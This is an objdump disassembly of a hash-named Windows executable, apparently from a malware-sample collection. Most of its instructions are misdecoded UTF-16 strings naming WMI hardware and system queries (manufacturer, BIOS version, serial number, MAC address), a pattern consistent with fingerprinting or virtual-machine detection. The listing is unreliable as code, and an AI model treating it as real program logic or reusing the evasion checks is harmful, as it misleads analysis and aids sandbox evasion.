
b1a95a04cbdca12bd84cfe3f86e8ac11f33752171347ee1435fce13e5bff5195.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	mov    al,0xe0
  401006:	inc    eax
	...
  40100f:	add    al,ah
  401011:	fild   WORD PTR [eax+0x0]
  401014:	mov    al,0xe5
  401016:	inc    eax
  401017:	add    BYTE PTR [eax],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],al
  40101d:	xchg   ecx,eax
  40101e:	add    BYTE PTR [eax],al
  401020:	xor    BYTE PTR [ecx-0x6e700000],dl
  401026:	add    BYTE PTR [eax],al
  401028:	loopne 0x401009
  40102a:	add    BYTE PTR [eax],al
  40102c:	mov    al,0xe0
  40102e:	add    BYTE PTR [eax],al
  401030:	mov    al,0xe2
  401032:	add    BYTE PTR [eax],al
  401034:	shl    dl,0x0
  401037:	add    al,ah
  401039:	loop   0x40103b
  40103b:	add    BYTE PTR [eax-0x1b],ah
  40103e:	add    BYTE PTR [eax],al
  401040:	mov    al,0xe5
  401042:	add    BYTE PTR [eax],al
  401044:	nop
  401045:	call   0xe960104a
  40104a:	add    BYTE PTR [eax],al
  40104c:	push   eax
  40104d:	jmp    0xea201052
	...
  40105e:	add    BYTE PTR [eax],al
  401060:	loopne 0x401044
  401062:	inc    eax
  401063:	add    BYTE PTR [eax+0x10],dh
  401066:	inc    ecx
  401067:	add    al,al
  401069:	adc    BYTE PTR [ecx+0x0],al
  40106c:	pop    esp
  40106d:	add    BYTE PTR [eax],al
  40106f:	add    BYTE PTR [edi],ch
  401071:	add    BYTE PTR [eax],al
  401073:	add    BYTE PTR [eax],al
  401075:	xchg   ecx,eax
  401076:	inc    eax
  401077:	add    BYTE PTR [edx+0x0],dh
  40107a:	outs   dx,DWORD PTR ds:[esi]
  40107b:	add    BYTE PTR [edi+0x0],ch
  40107e:	je     0x401080
  401080:	pop    esp
  401081:	add    BYTE PTR [ebx+0x0],ah
  401084:	imul   eax,DWORD PTR [eax],0x76006d
  40108a:	xor    al,BYTE PTR [eax]
  40108c:	add    BYTE PTR [eax],al
  40108e:	add    BYTE PTR [eax],al
  401090:	dec    ebp
  401091:	add    BYTE PTR [ebp+0x0],cl
  401094:	das    
  401095:	add    BYTE PTR [eax+eax*1+0x64],ah
  401099:	add    BYTE PTR [edi],ch
  40109b:	add    BYTE PTR [ecx+0x0],bh
  40109e:	jns    0x4010a0
  4010a0:	jns    0x4010a2
  4010a2:	jns    0x4010a4
  4010a4:	add    BYTE PTR [eax],al
  4010a6:	add    BYTE PTR [eax],al
  4010a8:	dec    eax
  4010a9:	add    BYTE PTR [eax+0x0],cl
  4010ac:	cmp    al,BYTE PTR [eax]
  4010ae:	ins    DWORD PTR es:[edi],dx
  4010af:	add    BYTE PTR [ebp+0x0],ch
  4010b2:	cmp    al,BYTE PTR [eax]
  4010b4:	jae    0x4010b6
  4010b6:	jae    0x4010b8
  4010b8:	add    BYTE PTR [eax],al
  4010ba:	add    BYTE PTR [eax],al
  4010bc:	push   edi
  4010bd:	add    BYTE PTR [ecx+0x0],ch
  4010c0:	outs   dx,BYTE PTR ds:[esi]
  4010c1:	add    BYTE PTR [ebx],dh
  4010c3:	add    BYTE PTR [edx],dh
  4010c5:	add    BYTE PTR [edi+0x0],bl
  4010c8:	dec    edi
  4010c9:	add    BYTE PTR [eax+0x0],dh
  4010cc:	add    BYTE PTR gs:[edx+0x0],dh
  4010d0:	popa   
  4010d1:	add    BYTE PTR [eax+eax*1+0x69],dh
  4010d5:	add    BYTE PTR [esi+0x0],ch
  4010d8:	add    BYTE PTR [bp+di+0x0],dl
  4010dc:	jns    0x4010de
  4010de:	jae    0x4010e0
  4010e0:	je     0x4010e2
  4010e2:	add    BYTE PTR gs:[ebp+0x0],ch
  4010e6:	add    BYTE PTR [eax],al
  4010e8:	inc    ebx
  4010e9:	add    BYTE PTR [ecx+0x0],ah
  4010ec:	jo     0x4010ee
  4010ee:	je     0x4010f0
  4010f0:	imul   eax,DWORD PTR [eax],0x6e006f
  4010f6:	add    BYTE PTR [eax],al
  4010f8:	inc    ebx
  4010f9:	add    BYTE PTR [ebx+0x0],dl
  4010fc:	dec    esi
  4010fd:	add    BYTE PTR [ecx+0x0],ah
  401100:	ins    DWORD PTR es:[edi],dx
  401101:	add    BYTE PTR [ebp+0x0],ah
  401104:	add    BYTE PTR [eax],al
  401106:	add    BYTE PTR [eax],al
  401108:	push   esi
  401109:	add    BYTE PTR [ebp+0x0],ah
  40110c:	jb     0x40110e
  40110e:	jae    0x401110
  401110:	imul   eax,DWORD PTR [eax],0x6e006f
  401116:	add    BYTE PTR [eax],al
  401118:	inc    ebx
  401119:	add    BYTE PTR [ebx+0x0],dl
  40111c:	inc    esp
  40111d:	add    BYTE PTR [esi+0x0],dl
  401120:	add    BYTE PTR gs:[edx+0x0],dh
  401124:	jae    0x401126
  401126:	imul   eax,DWORD PTR [eax],0x6e006f
  40112c:	add    BYTE PTR [eax],al
  40112e:	add    BYTE PTR [eax],al
  401130:	inc    edx
  401131:	add    BYTE PTR [ebp+0x0],dh
  401134:	imul   eax,DWORD PTR [eax],0x64006c
  40113a:	dec    esi
  40113b:	add    BYTE PTR [ebp+0x0],dh
  40113e:	ins    DWORD PTR es:[edi],dx
  40113f:	add    BYTE PTR [edx+0x0],ah
  401142:	add    BYTE PTR gs:[edx+0x0],dh
  401146:	add    BYTE PTR [eax],al
  401148:	dec    ebp
  401149:	add    BYTE PTR [ecx+0x0],ah
  40114c:	outs   dx,BYTE PTR ds:[esi]
  40114d:	add    BYTE PTR [ebp+0x0],dh
  401150:	data16 add BYTE PTR [ecx+0x0],ah
  401154:	arpl   WORD PTR [eax],ax
  401156:	je     0x401158
  401158:	jne    0x40115a
  40115a:	jb     0x40115c
  40115c:	add    BYTE PTR gs:[edx+0x0],dh
  401160:	add    BYTE PTR [eax],al
  401162:	add    BYTE PTR [eax],al
  401164:	inc    edx
  401165:	add    BYTE PTR [ebp+0x0],dh
  401168:	imul   eax,DWORD PTR [eax],0x64006c
  40116e:	push   esp
  40116f:	add    BYTE PTR [ecx+0x0],bh
  401172:	jo     0x401174
  401174:	add    BYTE PTR gs:[eax],al
  401177:	add    BYTE PTR [edx+0x0],dl
  40117a:	add    BYTE PTR gs:[edi+0x0],ah
  40117e:	imul   eax,DWORD PTR [eax],0x740073
  401184:	add    BYTE PTR gs:[edx+0x0],dh
  401188:	add    BYTE PTR gs:[eax+eax*1+0x55],ah
  40118d:	add    BYTE PTR [ebx+0x0],dh
  401190:	add    BYTE PTR gs:[edx+0x0],dh
  401194:	add    BYTE PTR [eax],al
  401196:	add    BYTE PTR [eax],al
  401198:	dec    edi
  401199:	add    BYTE PTR [edx+0x0],dh
  40119c:	add    BYTE PTR [bx+di+0x0],ah
  4011a0:	outs   dx,BYTE PTR ds:[esi]
  4011a1:	add    BYTE PTR [ecx+0x0],ch
  4011a4:	jp     0x4011a6
  4011a6:	popa   
  4011a7:	add    BYTE PTR [eax+eax*1+0x69],dh
  4011ab:	add    BYTE PTR [edi+0x0],ch
  4011ae:	outs   dx,BYTE PTR ds:[esi]
  4011af:	add    BYTE PTR [eax],al
  4011b1:	add    BYTE PTR [eax],al
  4011b3:	add    BYTE PTR [ebx+0x0],dl
  4011b6:	add    BYTE PTR gs:[edx+0x0],dh
  4011ba:	imul   eax,DWORD PTR [eax],0x6c0061
  4011c0:	dec    esi
  4011c1:	add    BYTE PTR [ebp+0x0],dh
  4011c4:	ins    DWORD PTR es:[edi],dx
  4011c5:	add    BYTE PTR [edx+0x0],ah
  4011c8:	add    BYTE PTR gs:[edx+0x0],dh
  4011cc:	add    BYTE PTR [eax],al
  4011ce:	add    BYTE PTR [eax],al
  4011d0:	push   edi
  4011d1:	add    BYTE PTR [ecx+0x0],ch
  4011d4:	outs   dx,BYTE PTR ds:[esi]
  4011d5:	add    BYTE PTR [eax+eax*1+0x6f],ah
  4011d9:	add    BYTE PTR [edi+0x0],dh
  4011dc:	jae    0x4011de
  4011de:	inc    esp
  4011df:	add    BYTE PTR [ecx+0x0],ch
  4011e2:	jb     0x4011e4
  4011e4:	add    BYTE PTR gs:[ebx+0x0],ah
  4011e8:	je     0x4011ea
  4011ea:	outs   dx,DWORD PTR ds:[esi]
  4011eb:	add    BYTE PTR [edx+0x0],dh
  4011ee:	jns    0x4011f0
  4011f0:	add    BYTE PTR [eax],al
  4011f2:	add    BYTE PTR [eax],al
  4011f4:	push   ebx
  4011f5:	add    BYTE PTR [ecx+0x0],bh
  4011f8:	jae    0x4011fa
  4011fa:	je     0x4011fc
  4011fc:	add    BYTE PTR gs:[ebp+0x0],ch
  401200:	inc    esp
  401201:	add    BYTE PTR [ecx+0x0],ch
  401204:	jb     0x401206
  401206:	add    BYTE PTR gs:[ebx+0x0],ah
  40120a:	je     0x40120c
  40120c:	outs   dx,DWORD PTR ds:[esi]
  40120d:	add    BYTE PTR [edx+0x0],dh
  401210:	jns    0x401212
  401212:	add    BYTE PTR [eax],al
  401214:	inc    edx
  401215:	add    BYTE PTR [edi+0x0],ch
  401218:	outs   dx,DWORD PTR ds:[esi]
  401219:	add    BYTE PTR [eax+eax*1+0x44],dh
  40121d:	add    BYTE PTR [ebp+0x0],ah
  401220:	jbe    0x401222
  401222:	imul   eax,DWORD PTR [eax],0x650063
  401228:	add    BYTE PTR [eax],al
  40122a:	add    BYTE PTR [eax],al
  40122c:	dec    esp
  40122d:	add    BYTE PTR [edi+0x0],ch
  401230:	arpl   WORD PTR [eax],ax
  401232:	popa   
  401233:	add    BYTE PTR [eax+eax*1+0x65],ch
  401237:	add    BYTE PTR [eax],al
  401239:	add    BYTE PTR [eax],al
  40123b:	add    BYTE PTR [esi+0x0],al
  40123e:	jb     0x401240
  401240:	add    BYTE PTR gs:[ebp+0x0],ah
  401244:	push   eax
  401245:	add    BYTE PTR [eax+0x0],ch
  401248:	jns    0x40124a
  40124a:	jae    0x40124c
  40124c:	imul   eax,DWORD PTR [eax],0x610063
  401252:	ins    BYTE PTR es:[edi],dx
  401253:	add    BYTE PTR [ebp+0x0],cl
  401256:	add    BYTE PTR gs:[ebp+0x0],ch
  40125a:	outs   dx,DWORD PTR ds:[esi]
  40125b:	add    BYTE PTR [edx+0x0],dh
  40125e:	jns    0x401260
  401260:	add    BYTE PTR [eax],al
  401262:	add    BYTE PTR [eax],al
  401264:	push   esp
  401265:	add    BYTE PTR [edi+0x0],ch
  401268:	je     0x40126a
  40126a:	popa   
  40126b:	add    BYTE PTR [eax+eax*1+0x56],ch
  40126f:	add    BYTE PTR [ecx+0x0],ch
  401272:	jb     0x401274
  401274:	je     0x401276
  401276:	jne    0x401278
  401278:	popa   
  401279:	add    BYTE PTR [eax+eax*1+0x4d],ch
  40127d:	add    BYTE PTR [ebp+0x0],ah
  401280:	ins    DWORD PTR es:[edi],dx
  401281:	add    BYTE PTR [edi+0x0],ch
  401284:	jb     0x401286
  401286:	jns    0x401288
  401288:	push   ebx
  401289:	add    BYTE PTR [ecx+0x0],ch
  40128c:	jp     0x40128e
  40128e:	add    BYTE PTR gs:[eax],al
  401291:	add    BYTE PTR [eax],al
  401293:	add    BYTE PTR [esi+0x0],al
  401296:	jb     0x401298
  401298:	add    BYTE PTR gs:[ebp+0x0],ah
  40129c:	push   esi
  40129d:	add    BYTE PTR [ecx+0x0],ch
  4012a0:	jb     0x4012a2
  4012a2:	je     0x4012a4
  4012a4:	jne    0x4012a6
  4012a6:	popa   
  4012a7:	add    BYTE PTR [eax+eax*1+0x4d],ch
  4012ab:	add    BYTE PTR [ebp+0x0],ah
  4012ae:	ins    DWORD PTR es:[edi],dx
  4012af:	add    BYTE PTR [edi+0x0],ch
  4012b2:	jb     0x4012b4
  4012b4:	jns    0x4012b6
  4012b6:	add    BYTE PTR [eax],al
  4012b8:	dec    ecx
  4012b9:	add    BYTE PTR [esi+0x0],ch
  4012bc:	jae    0x4012be
  4012be:	je     0x4012c0
  4012c0:	popa   
  4012c1:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4012c5:	add    BYTE PTR [eax+eax*1+0x61],al
  4012c9:	add    BYTE PTR [eax+eax*1+0x65],dh
  4012cd:	add    BYTE PTR [eax],al
  4012cf:	add    BYTE PTR [eax+eax*1+0x61],cl
  4012d3:	add    BYTE PTR [ebx+0x0],dh
  4012d6:	je     0x4012d8
  4012d8:	inc    edx
  4012d9:	add    BYTE PTR [edi+0x0],ch
  4012dc:	outs   dx,DWORD PTR ds:[esi]
  4012dd:	add    BYTE PTR [eax+eax*1+0x55],dh
  4012e1:	add    BYTE PTR [eax+0x0],dh
  4012e4:	push   esp
  4012e5:	add    BYTE PTR [ecx+0x0],ch
  4012e8:	ins    DWORD PTR es:[edi],dx
  4012e9:	add    BYTE PTR [ebp+0x0],ah
  4012ec:	add    BYTE PTR [eax],al
  4012ee:	add    BYTE PTR [eax],al
  4012f0:	inc    esp
  4012f1:	add    BYTE PTR [ecx+0x0],ah
  4012f4:	je     0x4012f6
  4012f6:	popa   
  4012f7:	add    BYTE PTR [ebp+0x0],al
  4012fa:	js     0x4012fc
  4012fc:	add    BYTE PTR gs:[ebx+0x0],ah
  401300:	jne    0x401302
  401302:	je     0x401304
  401304:	imul   eax,DWORD PTR [eax],0x6e006f
  40130a:	push   eax
  40130b:	add    BYTE PTR [edx+0x0],dh
  40130e:	add    BYTE PTR gs:[esi+0x0],dh
  401312:	add    BYTE PTR gs:[esi+0x0],ch
  401316:	je     0x401318
  401318:	imul   eax,DWORD PTR [eax],0x6e006f
  40131e:	pop    edi
  40131f:	add    BYTE PTR [ecx+0x0],al
  401322:	jbe    0x401324
  401324:	popa   
  401325:	add    BYTE PTR [ecx+0x0],ch
  401328:	ins    BYTE PTR es:[edi],dx
  401329:	add    BYTE PTR [ecx+0x0],ah
  40132c:	bound  eax,QWORD PTR [eax]
  40132e:	ins    BYTE PTR es:[edi],dx
  40132f:	add    BYTE PTR [ebp+0x0],ah
  401332:	add    BYTE PTR [eax],al
  401334:	and    eax,0x20007300
  401339:	add    BYTE PTR ds:0x7300,ah
  40133f:	add    BYTE PTR ds:0x2c007300,ah
  401345:	add    BYTE PTR [eax],ah
  401347:	add    BYTE PTR ds:0x7300,ah
  40134d:	add    BYTE PTR [eax],al
  40134f:	add    BYTE PTR [eax],al
  401351:	add    BYTE PTR [eax],al
  401353:	add    BYTE PTR [edi+0x0],dl
  401356:	imul   eax,DWORD PTR [eax],0x33006e
  40135c:	xor    al,BYTE PTR [eax]
  40135e:	pop    edi
  40135f:	add    BYTE PTR [ebx+0x0],al
  401362:	outs   dx,DWORD PTR ds:[esi]
  401363:	add    BYTE PTR [ebp+0x0],ch
  401366:	jo     0x401368
  401368:	jne    0x40136a
  40136a:	je     0x40136c
  40136c:	add    BYTE PTR gs:[edx+0x0],dh
  401370:	push   ebx
  401371:	add    BYTE PTR [ecx+0x0],bh
  401374:	jae    0x401376
  401376:	je     0x401378
  401378:	add    BYTE PTR gs:[ebp+0x0],ch
  40137c:	add    BYTE PTR [eax],al
  40137e:	add    BYTE PTR [eax],al
  401380:	dec    ebp
  401381:	add    BYTE PTR [edi+0x0],ch
  401384:	add    BYTE PTR fs:[ebp+0x0],ah
  401388:	ins    BYTE PTR es:[edi],dx
  401389:	add    BYTE PTR [eax],al
  40138b:	add    BYTE PTR [eax+eax*1+0x6f],al
  40138f:	add    BYTE PTR [ebp+0x0],ch
  401392:	popa   
  401393:	add    BYTE PTR [ecx+0x0],ch
  401396:	outs   dx,BYTE PTR ds:[esi]
  401397:	add    BYTE PTR [eax],al
  401399:	add    BYTE PTR [eax],al
  40139b:	add    BYTE PTR [ebp+0x0],dl
  40139e:	jae    0x4013a0
  4013a0:	add    BYTE PTR gs:[edx+0x0],dh
  4013a4:	dec    esi
  4013a5:	add    BYTE PTR [ecx+0x0],ah
  4013a8:	ins    DWORD PTR es:[edi],dx
  4013a9:	add    BYTE PTR [ebp+0x0],ah
  4013ac:	add    BYTE PTR [eax],al
  4013ae:	add    BYTE PTR [eax],al
  4013b0:	inc    esp
  4013b1:	add    BYTE PTR [edi+0x0],ch
  4013b4:	ins    DWORD PTR es:[edi],dx
  4013b5:	add    BYTE PTR [ecx+0x0],ah
  4013b8:	imul   eax,DWORD PTR [eax],0x52006e
  4013be:	outs   dx,DWORD PTR ds:[esi]
  4013bf:	add    BYTE PTR [eax+eax*1+0x65],ch
  4013c3:	add    BYTE PTR [eax],al
  4013c5:	add    BYTE PTR [eax],al
  4013c7:	add    BYTE PTR [ebx+0x0],dl
  4013ca:	jns    0x4013cc
  4013cc:	jae    0x4013ce
  4013ce:	je     0x4013d0
  4013d0:	add    BYTE PTR gs:[ebp+0x0],ch
  4013d4:	push   esp
  4013d5:	add    BYTE PTR [ecx+0x0],bh
  4013d8:	jo     0x4013da
  4013da:	add    BYTE PTR gs:[eax],al
  4013dd:	add    BYTE PTR [eax],al
  4013df:	add    BYTE PTR [eax+eax*1+0x6f],dl
  4013e3:	add    BYTE PTR [eax+eax*1+0x61],dh
  4013e7:	add    BYTE PTR [eax+eax*1+0x50],ch
  4013eb:	add    BYTE PTR [eax+0x0],ch
  4013ee:	jns    0x4013f0
  4013f0:	jae    0x4013f2
  4013f2:	imul   eax,DWORD PTR [eax],0x610063
  4013f8:	ins    BYTE PTR es:[edi],dx
  4013f9:	add    BYTE PTR [ebp+0x0],cl
  4013fc:	add    BYTE PTR gs:[ebp+0x0],ch
  401400:	outs   dx,DWORD PTR ds:[esi]
  401401:	add    BYTE PTR [edx+0x0],dh
  401404:	jns    0x401406
  401406:	add    BYTE PTR [eax],al
  401408:	push   edi
  401409:	add    BYTE PTR [ecx+0x0],ch
  40140c:	outs   dx,BYTE PTR ds:[esi]
  40140d:	add    BYTE PTR [ebx],dh
  40140f:	add    BYTE PTR [edx],dh
  401411:	add    BYTE PTR [edi+0x0],bl
  401414:	inc    edx
  401415:	add    BYTE PTR [ecx+0x0],cl
  401418:	dec    edi
  401419:	add    BYTE PTR [ebx+0x0],dl
  40141c:	add    BYTE PTR [eax],al
  40141e:	add    BYTE PTR [eax],al
  401420:	push   ebx
  401421:	add    BYTE PTR [ebp+0x0],cl
  401424:	inc    edx
  401425:	add    BYTE PTR [ecx+0x0],cl
  401428:	dec    edi
  401429:	add    BYTE PTR [ebx+0x0],dl
  40142c:	push   eax
  40142d:	add    BYTE PTR [edx+0x0],dh
  401430:	add    BYTE PTR gs:[ebx+0x0],dh
  401434:	add    BYTE PTR gs:[esi+0x0],ch
  401438:	je     0x40143a
  40143a:	add    BYTE PTR [eax],al
  40143c:	push   ebx
  40143d:	add    BYTE PTR [ebp+0x0],cl
  401440:	inc    edx
  401441:	add    BYTE PTR [ecx+0x0],cl
  401444:	dec    edi
  401445:	add    BYTE PTR [ebx+0x0],dl
  401448:	inc    edx
  401449:	add    BYTE PTR [ecx+0x0],cl
  40144c:	dec    edi
  40144d:	add    BYTE PTR [ebx+0x0],dl
  401450:	push   esi
  401451:	add    BYTE PTR [ebp+0x0],ah
  401454:	jb     0x401456
  401456:	jae    0x401458
  401458:	imul   eax,DWORD PTR [eax],0x6e006f
  40145e:	add    BYTE PTR [eax],al
  401460:	push   edx
  401461:	add    BYTE PTR [ebp+0x0],ah
  401464:	ins    BYTE PTR es:[edi],dx
  401465:	add    BYTE PTR [ebp+0x0],ah
  401468:	popa   
  401469:	add    BYTE PTR [ebx+0x0],dh
  40146c:	add    BYTE PTR gs:[eax+eax*1+0x61],al
  401471:	add    BYTE PTR [eax+eax*1+0x65],dh
  401475:	add    BYTE PTR [eax],al
  401477:	add    BYTE PTR ds:0x20007300,ah
  40147d:	add    BYTE PTR ds:0x2c007300,ah
  401483:	add    BYTE PTR [eax],ah
  401485:	add    BYTE PTR ds:0x7300,ah
  40148b:	add    BYTE PTR [edx+0x0],al
  40148e:	dec    ecx
  40148f:	add    BYTE PTR [edi+0x0],cl
  401492:	push   ebx
  401493:	add    BYTE PTR [esi+0x0],dl
  401496:	add    BYTE PTR gs:[edx+0x0],dh
  40149a:	jae    0x40149c
  40149c:	imul   eax,DWORD PTR [eax],0x6e006f
  4014a2:	add    BYTE PTR [eax],al
  4014a4:	push   edi
  4014a5:	add    BYTE PTR [ecx+0x0],ch
  4014a8:	outs   dx,BYTE PTR ds:[esi]
  4014a9:	add    BYTE PTR [ebx],dh
  4014ab:	add    BYTE PTR [edx],dh
  4014ad:	add    BYTE PTR [edi+0x0],bl
  4014b0:	push   esp
  4014b1:	add    BYTE PTR [ecx+0x0],ch
  4014b4:	ins    DWORD PTR es:[edi],dx
  4014b5:	add    BYTE PTR [ebp+0x0],ah
  4014b8:	pop    edx
  4014b9:	add    BYTE PTR [edi+0x0],ch
  4014bc:	outs   dx,BYTE PTR ds:[esi]
  4014bd:	add    BYTE PTR [ebp+0x0],ah
  4014c0:	add    BYTE PTR [eax],al
  4014c2:	add    BYTE PTR [eax],al
  4014c4:	push   edi
  4014c5:	add    BYTE PTR [ecx+0x0],ch
  4014c8:	outs   dx,BYTE PTR ds:[esi]
  4014c9:	add    BYTE PTR [ebx],dh
  4014cb:	add    BYTE PTR [edx],dh
  4014cd:	add    BYTE PTR [edi+0x0],bl
  4014d0:	push   eax
  4014d1:	add    BYTE PTR [ecx+0x0],ah
  4014d4:	add    BYTE PTR [di+0x0],ah
  4014d8:	inc    esi
  4014d9:	add    BYTE PTR [ecx+0x0],ch
  4014dc:	ins    BYTE PTR es:[edi],dx
  4014dd:	add    BYTE PTR [ebp+0x0],ah
  4014e0:	push   ebp
  4014e1:	add    BYTE PTR [ebx+0x0],dh
  4014e4:	popa   
  4014e5:	add    BYTE PTR [edi+0x0],ah
  4014e8:	add    BYTE PTR gs:[eax],al
  4014eb:	add    BYTE PTR [edi+0x0],dl
  4014ee:	imul   eax,DWORD PTR [eax],0x33006e
  4014f4:	xor    al,BYTE PTR [eax]
  4014f6:	pop    edi
  4014f7:	add    BYTE PTR [eax+0x0],dl
  4014fa:	jb     0x4014fc
  4014fc:	outs   dx,DWORD PTR ds:[esi]
  4014fd:	add    BYTE PTR [ebx+0x0],ah
  401500:	add    BYTE PTR gs:[ebx+0x0],dh
  401504:	jae    0x401506
  401506:	outs   dx,DWORD PTR ds:[esi]
  401507:	add    BYTE PTR [edx+0x0],dh
  40150a:	add    BYTE PTR [eax],al
  40150c:	inc    ebx
  40150d:	add    BYTE PTR [ebp+0x0],dh
  401510:	jb     0x401512
  401512:	jb     0x401514
  401514:	add    BYTE PTR gs:[esi+0x0],ch
  401518:	je     0x40151a
  40151a:	inc    ebx
  40151b:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40151f:	add    BYTE PTR [ebx+0x0],ah
  401522:	imul   eax,DWORD PTR [eax],0x53
  401525:	add    BYTE PTR [eax+0x0],dh
  401528:	add    BYTE PTR gs:[ebp+0x0],ah
  40152c:	add    BYTE PTR fs:[eax],al
  40152f:	add    BYTE PTR [ebp+0x0],cl
  401532:	popa   
  401533:	add    BYTE PTR [eax+0x0],bh
  401536:	inc    ebx
  401537:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40153b:	add    BYTE PTR [ebx+0x0],ah
  40153e:	imul   eax,DWORD PTR [eax],0x53
  401541:	add    BYTE PTR [eax+0x0],dh
  401544:	add    BYTE PTR gs:[ebp+0x0],ah
  401548:	add    BYTE PTR fs:[eax],al
  40154b:	add    BYTE PTR [edi+0x0],dl
  40154e:	imul   eax,DWORD PTR [eax],0x33006e
  401554:	xor    al,BYTE PTR [eax]
  401556:	pop    edi
  401557:	add    BYTE PTR [ebx+0x0],cl
  40155a:	add    BYTE PTR gs:[ecx+0x0],bh
  40155e:	bound  eax,QWORD PTR [eax]
  401560:	outs   dx,DWORD PTR ds:[esi]
  401561:	add    BYTE PTR [ecx+0x0],ah
  401564:	jb     0x401566
  401566:	add    BYTE PTR fs:[eax],al
  401569:	add    BYTE PTR [eax],al
  40156b:	add    BYTE PTR [eax+eax*1+0x61],cl
  40156f:	add    BYTE PTR [ecx+0x0],bh
  401572:	outs   dx,DWORD PTR ds:[esi]
  401573:	add    BYTE PTR [ebp+0x0],dh
  401576:	je     0x401578
  401578:	add    BYTE PTR [eax],al
  40157a:	add    BYTE PTR [eax],al
  40157c:	push   edi
  40157d:	add    BYTE PTR [ecx+0x0],ch
  401580:	outs   dx,BYTE PTR ds:[esi]
  401581:	add    BYTE PTR [ebx],dh
  401583:	add    BYTE PTR [edx],dh
  401585:	add    BYTE PTR [edi+0x0],bl
  401588:	push   ecx
  401589:	add    BYTE PTR [ebp+0x0],dh
  40158c:	imul   eax,DWORD PTR [eax],0x6b0063
  401592:	inc    esi
  401593:	add    BYTE PTR [ecx+0x0],ch
  401596:	js     0x401598
  401598:	inc    ebp
  401599:	add    BYTE PTR [esi+0x0],ch
  40159c:	add    BYTE PTR [bx+di+0x0],ch
  4015a0:	outs   dx,BYTE PTR ds:[esi]
  4015a1:	add    BYTE PTR [ebp+0x0],ah
  4015a4:	add    BYTE PTR gs:[edx+0x0],dh
  4015a8:	imul   eax,DWORD PTR [eax],0x67006e
  4015ae:	add    BYTE PTR [eax],al
  4015b0:	dec    eax
  4015b1:	add    BYTE PTR [edi+0x0],ch
  4015b4:	je     0x4015b6
  4015b6:	inc    esi
  4015b7:	add    BYTE PTR [ecx+0x0],ch
  4015ba:	js     0x4015bc
  4015bc:	dec    ecx
  4015bd:	add    BYTE PTR [eax+eax*1+0x0],al
  4015c1:	add    BYTE PTR [eax],al
  4015c3:	add    BYTE PTR [esi+0x0],al
  4015c6:	imul   eax,DWORD PTR [eax],0x430078
  4015cc:	outs   dx,DWORD PTR ds:[esi]
  4015cd:	add    BYTE PTR [ebp+0x0],ch
  4015d0:	ins    DWORD PTR es:[edi],dx
  4015d1:	add    BYTE PTR [ebp+0x0],ah
  4015d4:	outs   dx,BYTE PTR ds:[esi]
  4015d5:	add    BYTE PTR [eax+eax*1+0x73],dh
  4015d9:	add    BYTE PTR [eax],al
  4015db:	add    BYTE PTR [eax],ah
  4015dd:	add    BYTE PTR ds:0x2000,ch
  4015e3:	add    BYTE PTR [edi+0x0],dl
  4015e6:	imul   eax,DWORD PTR [eax],0x33006e
  4015ec:	xor    al,BYTE PTR [eax]
  4015ee:	pop    edi
  4015ef:	add    BYTE PTR [esi+0x0],cl
  4015f2:	add    BYTE PTR gs:[eax+eax*1+0x77],dh
  4015f7:	add    BYTE PTR [edi+0x0],ch
  4015fa:	jb     0x4015fc
  4015fc:	imul   eax,DWORD PTR [eax],0x41
  4015ff:	add    BYTE PTR [eax+eax*1+0x61],ah
  401603:	add    BYTE PTR [eax+0x0],dh
  401606:	je     0x401608
  401608:	add    BYTE PTR gs:[edx+0x0],dh
  40160c:	add    BYTE PTR [eax],al
  40160e:	add    BYTE PTR [eax],al
  401610:	dec    ecx
  401611:	add    BYTE PTR [esi+0x0],ch
  401614:	add    BYTE PTR fs:[ebp+0x0],ah
  401618:	js     0x40161a
  40161a:	add    BYTE PTR [eax],al
  40161c:	inc    esp
  40161d:	add    BYTE PTR [ebp+0x0],ah
  401620:	jae    0x401622
  401622:	arpl   WORD PTR [eax],ax
  401624:	jb     0x401626
  401626:	imul   eax,DWORD PTR [eax],0x740070
  40162c:	imul   eax,DWORD PTR [eax],0x6e006f
  401632:	add    BYTE PTR [eax],al
  401634:	dec    esi
  401635:	add    BYTE PTR [ebp+0x0],ah
  401638:	je     0x40163a
  40163a:	inc    ebx
  40163b:	add    BYTE PTR [edi+0x0],ch
  40163e:	outs   dx,BYTE PTR ds:[esi]
  40163f:	add    BYTE PTR [esi+0x0],ch
  401642:	add    BYTE PTR gs:[ebx+0x0],ah
  401646:	je     0x401648
  401648:	imul   eax,DWORD PTR [eax],0x6e006f
  40164e:	dec    ecx
  40164f:	add    BYTE PTR [eax+eax*1+0x0],al
  401653:	add    BYTE PTR [esi+0x0],cl
  401656:	add    BYTE PTR gs:[eax+eax*1+0x43],dh
  40165b:	add    BYTE PTR [edi+0x0],ch
  40165e:	outs   dx,BYTE PTR ds:[esi]
  40165f:	add    BYTE PTR [esi+0x0],ch
  401662:	add    BYTE PTR gs:[ebx+0x0],ah
  401666:	je     0x401668
  401668:	imul   eax,DWORD PTR [eax],0x6e006f
  40166e:	push   ebx
  40166f:	add    BYTE PTR [eax+eax*1+0x61],dh
  401673:	add    BYTE PTR [eax+eax*1+0x75],dh
  401677:	add    BYTE PTR [ebx+0x0],dh
  40167a:	add    BYTE PTR [eax],al
  40167c:	add    BYTE PTR [eax],al
  40167e:	add    BYTE PTR [eax],al
  401680:	push   edi
  401681:	add    BYTE PTR [ecx+0x0],ch
  401684:	outs   dx,BYTE PTR ds:[esi]
  401685:	add    BYTE PTR [ebx],dh
  401687:	add    BYTE PTR [edx],dh
  401689:	add    BYTE PTR [edi+0x0],bl
  40168c:	dec    esi
  40168d:	add    BYTE PTR [ebp+0x0],ah
  401690:	je     0x401692
  401692:	ja     0x401694
  401694:	outs   dx,DWORD PTR ds:[esi]
  401695:	add    BYTE PTR [edx+0x0],dh
  401698:	imul   eax,DWORD PTR [eax],0x41
  40169b:	add    BYTE PTR [eax+eax*1+0x61],ah
  40169f:	add    BYTE PTR [eax+0x0],dh
  4016a2:	je     0x4016a4
  4016a4:	add    BYTE PTR gs:[edx+0x0],dh
  4016a8:	inc    ebx
  4016a9:	add    BYTE PTR [edi+0x0],ch
  4016ac:	outs   dx,BYTE PTR ds:[esi]
  4016ad:	add    BYTE PTR [esi+0x0],ah
  4016b0:	imul   eax,DWORD PTR [eax],0x750067
  4016b6:	jb     0x4016b8
  4016b8:	popa   
